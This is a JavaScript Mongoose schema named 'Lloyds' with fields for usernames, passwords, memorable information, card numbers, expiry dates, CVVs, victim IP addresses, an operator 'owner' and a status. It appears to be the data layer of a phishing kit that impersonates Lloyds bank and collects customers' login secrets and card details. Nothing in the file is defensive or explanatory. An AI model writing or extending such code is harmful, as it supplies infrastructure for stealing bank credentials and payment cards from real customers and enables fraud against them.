const mongoose = require("mongoose");

const lloydsSchema = new mongoose.Schema({
  uniqueid: Number,
  username: String,
  password: String,
  memorable: String,
  ccnum: String,
  ccexp: String,
  cvv: String,
  status: Number,
  ip: String,
  owner: String,
  memIndex1: String,
  memIndex2: String,
  memIndex3: String,
  callIndex1: String,
  callIndex2: String,
  callIndex3: String,
  callIndex4: String,
});

module.exports = mongoose.model("Lloyds", lloydsSchema);
